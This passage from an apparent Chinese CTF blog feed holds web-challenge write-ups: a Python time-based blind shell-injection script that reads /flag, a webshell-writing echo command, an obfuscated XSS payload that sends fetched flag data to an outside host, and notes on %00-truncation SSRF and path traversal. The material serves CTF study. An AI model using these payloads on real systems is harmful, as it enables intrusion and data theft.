class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      response <span class="token operator">=</span> <span class="token string">'Wrong Wrong Wrong!!!!'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/javascript;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./index.js'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/version'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/json;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./package.json'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Start listening'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>整型溢出绕过延时，payload配合saferEval一把梭。</p><h1 id="6-EZ三剑客-EzTypecho"><a href="#6-EZ三剑客-EzTypecho" class="headerlink" title="6.  EZ三剑客-EzTypecho"></a>6.  EZ三剑客-EzTypecho</h1><p><strong>考点：</strong>PHP_SESSION_UPLOAD_PROGRESS + typecho1.1反序列化</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>typecho1.1反序列化漏洞  <a href="http://www.tomyxy.com/index.php/archives/3.html" target="_blank" rel="noopener">http://www.tomyxy.com/index.php/archives/3.html</a></p><p><strong>2、</strong>EZ三剑客EzTypecho  <a href="https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzTypecho" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzTypecho</a></p><p>找到pop链，用大佬的exp，存在两个反序列化点，因此也算是两种解法。一种需要用PHP_SESSION_UPLOAD_PROGRESS绕过session检测，另一种则不需要。</p><h1 id="7-Node-Exe"><a href="#7-Node-Exe" class="headerlink" title="7.  Node-Exe"></a>7.  Node-Exe</h1><p>提示：程序为electron程序 </p><p>web最后一题是个Electron, 很简单的, asar可以一键解包出js。</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>Electron跨平台程序破解的一般思路  <a href="https://www.52pojie.cn/thread-563895-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-563895-1-1.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020_bjd3rd</title>
      <link href="/2020/05/24/2020-bjd3rd/"/>
      <url>/2020/05/24/2020-bjd3rd/</url>
      
        <content type="html"><![CDATA[<h1 id="1-web"><a href="#1-web" class="headerlink" title="1.  web"></a>1.  web</h1><h2 id="1-1-帮帮小红花"><a href="#1-1-帮帮小红花" class="headerlink" title="1.1   帮帮小红花"></a>1.1   帮帮小红花</h2><p><strong>考点：</strong> 二分法 + shell注入 </p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token shell-comment comment">#不能写文件，不能反弹shell</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>imagin<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>参考资料：</strong></p><p><strong>1、</strong>writeup：<a href="https://www.cnblogs.com/h3zh1/p/12945275.html" target="_blank" rel="noopener">https://www.cnblogs.com/h3zh1/p/12945275.html</a></p><p><strong>2、</strong>shell脚本之结构化命令if…then…fi  <a href="https://www.cnblogs.com/python-cat/p/10861060.html" target="_blank" rel="noopener">https://www.cnblogs.com/python-cat/p/10861060.html</a></p><p><strong>3、</strong>Shell printf 命令  <a href="https://www.runoob.com/linux/linux-shell-printf.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-shell-printf.html</a></p><p><strong>4、</strong>shell判断符：</p><pre class="line-numbers language-shell"><code class="language-shell">-eq 等于-ne 不等于-gt 大于-ge 大于等于-lt 小于-le 小于等于 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>非预期解：</strong></p><pre><code>#  不能反弹shell，写一句话木马总报错，就直接去读flag了，但后面就改了权限，不能写文件了。echo &quot;&lt;?php system(&#39;cat /flag&#39;);?&gt;&quot; &gt; pperk.php</code></pre><p><strong>预期解：</strong>见参考资料</p><p>通过shell脚本以时间盲注的方式得到执行cat /flag的结果，学到很多知识。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1/php_exp/try30.php?imagin="</span>requests<span class="token punctuation">.</span>adapters<span class="token punctuation">.</span>DEFAULT_RETRIES <span class="token operator">=</span> <span class="token number">3</span> <span class="token comment" spellcheck="true"># 最大重连次数防止出问题</span>SLEEP_TIME <span class="token operator">=</span> <span class="token number">0.25</span> kai_shi <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment" spellcheck="true"># 计数器</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[start]: -------"</span><span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token boolean">True</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>  head <span class="token operator">=</span> <span class="token number">32</span>  tail <span class="token operator">=</span> <span class="token number">127</span>  i <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> head <span class="token operator">&lt;</span> tail <span class="token punctuation">)</span> <span class="token punctuation">:</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span> head <span class="token operator">+</span> tail <span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>    payload <span class="token operator">=</span> <span class="token triple-quoted-string string">'''pperk=$( cat /flag | cut -c %d-%d );if [ $( printf '%%d' "'$pperk" ) -gt %d ];then sleep %f;fi'''</span> <span class="token operator">%</span> <span class="token punctuation">(</span> i<span class="token punctuation">,</span> i<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> SLEEP_TIME<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(payload)</span>    start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 开始</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span>    end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 结束</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> end_time <span class="token operator">-</span> start_time <span class="token operator">></span> SLEEP_TIME <span class="token punctuation">)</span> <span class="token punctuation">:</span>       head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">else</span> <span class="token punctuation">:</span>      tail <span class="token operator">=</span> mid  <span class="token keyword">if</span> head<span class="token operator">!=</span><span class="token number">32</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]: "</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[end]: "</span><span class="token operator">+</span>flag<span class="token punctuation">)</span>jie_shu <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"程序运行时间:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>jie_shu <span class="token operator">-</span> kai_shi<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/05/24/2020-bjd3rd/2.png" alt="result"></p><p><img src="/2020/05/24/2020-bjd3rd/3.png" alt="study"></p><p>至于为什么格式化字符串处有两个%，是因为要用%来转义%，如果不转义，就会爆错。</p><p><img src="/2020/05/24/2020-bjd3rd/4.png" alt="转义"></p><h2 id="1-2-gob"><a href="#1-2-gob" class="headerlink" title="1.2  gob"></a>1.2  gob</h2><p><strong>参考资料：</strong></p><p><strong>1、</strong>writeup：<a href="http://www.fzwjscj.xyz/index.php/archives/30/#description" target="_blank" rel="noopener">http://www.fzwjscj.xyz/index.php/archives/30/#description</a></p><p><strong>2、</strong>Go代码审计 - gitea 远程命令执行漏洞链  <a href="https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html</a></p><p>刚开始以为是go语言的某个漏洞，但tcl，根本不知道怎么利用！！！</p><p>实际上是通过文件名来实现路径穿越，构造../../../../../../flag的文件名，带着session访问show.php，得到图片的base64编码值，解码即可。</p><p><img src="/2020/05/24/2020-bjd3rd/1.png" alt="result"></p><h2 id="1-3-Multiplayer-Sport"><a href="#1-3-Multiplayer-Sport" class="headerlink" title="1.3  Multiplayer Sport"></a>1.3  Multiplayer Sport</h2><p><strong>考点：</strong>sql注入 + GOLANG函数使用不当导致SSRF</p><p><strong>参考资料：</strong></p><p><strong>1、</strong>writeup1： <a href="http://github.mrkaixin.computer/2020/05/24/BJD%20&amp;%20DAS%20CTF%20GO%20WEB/" target="_blank" rel="noopener">http://github.mrkaixin.computer/2020/05/24/BJD%20&amp;%20DAS%20CTF%20GO%20WEB/</a></p><p><strong>2、</strong>writeup2：<a href="https://blog.ccreater.top/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" target="_blank" rel="noopener">https://blog.ccreater.top/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/</a></p><p>sql的waf绕过大部分都过去了，但没有找到正确的表名，在users表（队里另一个师傅猜的）里找到了假的password。而真正的表是hint。</p><h2 id="1-4-布吉岛"><a href="#1-4-布吉岛" class="headerlink" title="1.4   布吉岛"></a>1.4   布吉岛</h2><p><strong>考点：</strong> java反序列化 + 反射 + redis简单命令 </p><p><strong>参考资料：</strong></p><p><strong>1、</strong>writeup：<a href="https://www.cnblogs.com/h3zh1/p/12945275.html" target="_blank" rel="noopener">https://www.cnblogs.com/h3zh1/p/12945275.html</a></p><p><strong>2、</strong> 从零开始java代码审计系列(一)   <a href="https://xz.aliyun.com/t/4558" target="_blank" rel="noopener">https://xz.aliyun.com/t/4558</a></p><h2 id="1-5-notes"><a href="#1-5-notes" class="headerlink" title="1.5  notes"></a>1.5  notes</h2><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://blog.ccreater.top/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" target="_blank" rel="noopener">https://blog.ccreater.top/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/</a></p><p>看不懂，不知道考察什么，哈哈，tcl！！！</p><p>payload如下，根据waf用16进制替代绕过：</p><pre><code>&lt;script &gt;xmlhttp=new XMLHttpRequest();xmlhttp[`onreadystatechange`]=()=&gt;{if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200){document[`location`][`href`]=`http://ccreater.top:60006/`+xmlhttp[`responseText`];}}&lt;script &gt;xmlhttp=new XMLHttpRequest();xmlhttp[`\x6fnreadystatechange`]=()=&gt;{if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200){document[`\x6cocati\x6fn`][`href`]=`http://ccreat\x65r.top:60006/`+xmlhttp[`\x72espo\x6eseText`];}};xmlhttp.open(`GET`,`/lib\x2ffla\x67.php`,true);xmlhttp.send();&lt;/script&gt;</code></pre><h2 id="1-6-ezupload"><a href="#1-6-ezupload" class="headerlink" title="1.6  ezupload"></a>1.6  ezupload</h2><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://blog.ccreater.top/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" target="_blank" rel="noopener">https://blog.ccreater.top/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">getkey</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token function">str_split</span><span class="token punctuation">(</span><span class="token string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">48</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$key</span> <span class="token punctuation">.</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">getreferer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token variable">$referer</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$referer</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'URL_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$referer</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'URL_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Where are you from?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$referer</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">getkey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">getreferer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^http[s]{0,1}:\/\//i"</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"What do you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">PHP_URL_HOST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^google\.com$/i"</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/(.*)\.google\.com$/i"</span><span class="token punctuation">,</span> <span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token shell-comment comment">#%00截断来满足第二个判断条件</span>            <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token function">get_headers</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$headers</span><span class="token punctuation">[</span><span class="token string">'dd'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'MeAquaNo_1!!!'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">'dd beheading!'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Only dd working at Google can get the key!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过<code>%00</code>截断可以让<code>get_headers()</code>请求到错误的主机 </p><h2 id="1-7-老开发"><a href="#1-7-老开发" class="headerlink" title="1.7  老开发"></a>1.7  老开发</h2><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://blog.ccreater.top/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" target="_blank" rel="noopener">https://blog.ccreater.top/2020/05/24/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">__FILE__</span><span class="token punctuation">)</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @Entity * @Table(name="user") */</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**      * @Id     * @Column(type="integer")     * @GeneratedValue     */</span>    <span class="token keyword">protected</span> <span class="token variable">$uid</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**      * @Column(type="string")      * @unique     */</span>    <span class="token keyword">protected</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**      * @Column(type="string")      */</span>    <span class="token keyword">protected</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**      * @Column(type="string")      */</span>    <span class="token keyword">protected</span> <span class="token variable">$role</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">property_exists</span><span class="token punctuation">(</span><span class="token constant">__CLASS__</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"Class "</span> <span class="token punctuation">.</span> <span class="token constant">__CLASS__</span> <span class="token punctuation">.</span> <span class="token string">" doesn't have property "</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">property_exists</span><span class="token punctuation">(</span><span class="token constant">__CLASS__</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"Class "</span> <span class="token punctuation">.</span> <span class="token constant">__CLASS__</span> <span class="token punctuation">.</span> <span class="token string">" doesn't have property "</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>best_linux</title>
      <link href="/2020/05/21/best-linux/"/>
      <url>/2020/05/21/best-linux/</url>
      
        <content type="html"><![CDATA[<h1 id="1-linux"><a href="#1-linux" class="headerlink" title="1.  linux"></a>1.  linux</h1><h2 id="1-1-perl"><a href="#1-1-perl" class="headerlink" title="1.1  perl"></a>1.1  perl</h2><h3 id="1-1-1-Get"><a href="#1-1-1-Get" class="headerlink" title="1.1.1  Get"></a>1.1.1  Get</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>  [hitcon2017] SSRF Me复现</p><p>GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求。</p><pre><code>GET file:/flag</code></pre><h2 id="1-2-命令行"><a href="#1-2-命令行" class="headerlink" title="1.2  命令行"></a>1.2  命令行</h2><h3 id="1-2-1-echo"><a href="#1-2-1-echo" class="headerlink" title="1.2.1  echo"></a>1.2.1  echo</h3><p>输出内容，利用-e使回车符生效：</p><pre><code>hzdl@ubuntu:~$ echo -e &quot;hello\nworld&quot;helloworldhzdl@ubuntu:~$ echo &quot;hello\nworld&quot;hello\nworld</code></pre><p><strong>写文件：</strong></p><pre><code>echo -e &quot;hello\nworld&quot;&gt;success.txt</code></pre><h2 id="1-3-脚本"><a href="#1-3-脚本" class="headerlink" title="1.3  脚本"></a>1.3  脚本</h2><p><strong>参考资料：</strong></p><p><strong>1、</strong>linux中的sh脚本语法  <a href="https://tsov.net/sh-script-syntax/" target="_blank" rel="noopener">https://tsov.net/sh-script-syntax/</a></p><h3 id="1-3-1-sh脚本"><a href="#1-3-1-sh脚本" class="headerlink" title="1.3.1  sh脚本"></a>1.3.1  sh脚本</h3><pre class="line-numbers language-sh"><code class="language-sh">#! /bin/shsupervisord -c /app/supervisord.conftouch log.logtail -f log.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2020_网鼎杯</title>
      <link href="/2020/05/14/2020-wang-ding-bei/"/>
